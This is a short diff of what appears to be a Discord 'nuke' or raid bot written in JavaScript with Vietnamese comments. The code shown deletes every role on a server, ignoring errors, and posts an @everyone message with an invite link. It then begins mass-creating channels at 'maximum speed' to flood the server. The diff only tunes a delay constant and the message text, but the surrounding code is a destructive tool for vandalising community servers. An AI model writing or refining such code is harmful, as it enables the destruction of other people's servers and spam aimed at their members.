@@ -87,11 +87,11 @@ client.on("interactionCreate", async interaction => {
   for (const role of roles) {
     try {
       await role.delete();
-      await sleep(50);
+      await sleep(DELETE_DELAY);
     } catch {}
   }
 
-  await controlChannel.send("Đang Hoàn Tất @everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
+  await controlChannel.send(" @everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
 
   /* ===== TẠO KÊNH + GỬI TIN (TỐI ĐA TỐC ĐỘ) ===== */
   for (let i = 0; i < CREATE_COUNT; i += CREATE_BATCH) {
